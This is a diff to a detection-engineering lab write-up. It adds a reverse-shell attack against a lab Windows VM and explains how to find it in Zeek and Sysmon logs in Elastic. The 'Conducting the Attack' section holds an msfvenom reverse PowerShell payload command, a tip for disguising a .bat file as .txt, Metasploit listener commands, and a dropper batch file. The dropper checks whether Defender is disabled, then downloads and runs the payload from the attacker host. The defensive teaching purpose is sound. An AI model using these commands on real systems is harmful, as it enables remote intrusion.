@@ -517,22 +517,120 @@ powershell -Command "& {if ((Get-MPComputerStatus).RealTimeProtectionEnabled -eq
 
 ## Conducting the Attack
 
-From the ParrotOS VM, run `msfvenom -p cmd/window/reverse_powershell lhost=192.168.56.104 lport=8443 > shell.bat` to open up Metasploit.
+From the ParrotOS VM terminal, run the below command to generate a windows reverse PowerShell script payload into a file called "shell.bat". The listening host is the ParrotOS VM (192.168.56.104) and the listening port can be assigned an arbitrary port number (e.g. 8443).
+
+```
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.56.104 lport=8443 > shell.bat
+```
+
+
+
+>[!NOTE]
+> To obfuscate the file extension to make it appear like it has a .txt extension, run the command `mv shell.bat shell.txt` after creating shell.bat. It may be interesting to perform this attack with shell.bat and shell.txt and examine how Elastic/Zeek detects it.
+
+
+
+
+
+
+Next, we'll need to open Metasploit and prep the reverse shell by running the below commands.
+```
+sudo msfconsole
+```
+
+```
+use exploit/multi/handler
+```
+```
+options
+```
+
+
+
+Set the LHOST to 192.168.56.104 and LPORT to 8443 with the commands below.
+```
+set lhost 192.168.56.104
+```
+
+```
+set lport 8443
+```
+
+Start the reverse TCP handler/reverse shell (listening) with the command below
+```
+run
+```
+
+
+![alert2_metasploit](./images/alert2_metasploit.png)
+
+
+
+
+
+
+
+Testing.bat
+
+```
+@ECHO OFF
+powershell -Command "& {if ((Get-MPComputerStatus).RealTimeProtectionEnabled -eq $false) {Invoke-WebRequest -URI http://192.168.56.104:8000/shell.txt -OutFile c:\Windows\temp\shell.bat; c:\Windows\temp\shell.bat}}"
+```
 
 
 
 ## Alert Context
+We know that logs regarding HTTP traffic and activities (such as file sharing or downloads) can be captured with Zeek (`zeek.http`). We can run a general query below and see what returns. Additionally, we would want to toggle fields with values that may be interesting to us and can provide the relevant context of file sharing/download/extension. Some questions that come to mind are
+- What is the HTTP method that is being used?
+- What is the HTTP response code?
+- What is the URL path associated with the file download?
+- What is the IP address and port that is hosting the file?
+
+
+The fields `event.action`, `http.response.code`, `url.path`, `url.extension`, `destination.ip`, and `destination.port` can be toggled to help answer these questions and provide context.
+
+
+```
+event.dataset: zeek.http
+```
+
+![alert2_elastic](./images/alert2_elastic.png)
+
+
+There are several key critical pieces of information that we can observed. We know that file downloads will have a `event.action` of GET and a successful `http.response.code` of 200. We also know that batch files may be unusual, so we should be on the look out for `url.extensions` that have the values bat - in case of extension obfuscation, we should also be on the lookout for potential txt files. Most importantly, we need to understand if we are expecting any file transfers/downloads involving the values for `destination.ip` and `destination.port`.
+
+Files shared internally (even batch files) could be a normal activity, especially amongst the IT team. This is why it's important for Detection Engineers to understand their internal enterprise environment. One way to approach this detection contextually is to whitelist specific IP addresses that are expected and authorized to transmit files. We could also premptively black-list IP addresses known to utilize dropper file/sharing tactics in advance, in addition to alerting on any IP addresses we are not expecting to transmit files.
+
+
+We also know that logs pertaining to PowerShell execution should be captured by Sysmon (`windows.sysmon_operational`). We can run a general query below and see if anything interesting is returned. Additionally, we would want to toggle fields with values that may be interesting to us and can provide the relevant context related to PowerShell script execution. Some questions that come to mind are
+- What is the parent process name?
+- What commands/scripts did the parent process execute?
+- What commands/scripts did the child process execute?
+
+The fields `process.parent.name`, `process.parent.command_line`, and `process.command_line` can be toggled to help answer these questions and provide context.
+
+```
+event.dataset: windows.sysmon_operational
+```
+
+![alert2_elastic2](./images/alert2_elastic2.png)
+
+The relevant results pertaining to our Alert Scenario 2 are checked. Following the chain fo events, we can see that there was a parent process `cmd.exe` with the command line of `\..\..\testing.bat` (our dropper file). This then runs the PowerShell script within our dropper file which checks if Windows Defender is disabled and pulls the designated file from our ParrotOS VM, saves t as `shell.bat`. `shell.bat` is then executed with a parent process of `powershell.exe` which contains the PowerShell script to execute reverse shell payload.
+
+Based on this information, how could we approach the detecton? While it's possible that perhaps the dropper file `testing.bat` is the name of malicious file observed floating out in the wild or has been previously observed within an incident, detecting on this specific name could cause false negative situations as a future attack could easily use the same dropper file with a different name.
+
+Instead of taking a specific and explicit approach, we could try a more generalized direction based on the patterns we're seeing with our log results, such as the observation of a .bat file launching PowerShell. This approach would capture events regardless of file names and is more all emcompassing. 
+
+>[!NOTE]  
+> Detection Engineers need a thorough understanding of their internal enterprise environment. Employing a broad detection strategy to alert on PowerShell scripts initiated by batch files may result in numerous false positives, particularly since IT staff may commonly utilize batch files. While this project/course will accept a generalized approach for Alert Scenario 2, it is essential to carefully consider the potential impact of this strategy within a fully operational enterprise environment.
 
 
 
 
 
-## Query-Based Detection
 
+## Query-Based Detection #1
 
-
-
-## Threshold-Based Detection
 
 
 
